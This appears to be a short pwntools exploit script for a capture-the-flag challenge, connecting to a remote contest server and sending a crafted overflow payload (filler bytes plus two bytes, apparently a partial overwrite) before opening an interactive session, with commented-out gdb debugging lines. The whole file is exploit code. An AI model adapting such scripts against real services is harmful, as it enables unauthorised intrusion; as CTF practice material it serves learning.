from pwn import *

#target = process('./chall') 

#pid = gdb.attach(target, "\nb *read_board+29\nb *read_board+352\n set disassembly-flavor intel\ncontinue")

target = remote('host.cg21.metaproblems.com', 3120)

print(target.recvuntil(b'time if you prefer'))

payload = (b'a' * 9 + b'\x12' + b'\x4f')

target.sendline(payload)

target.interactive()
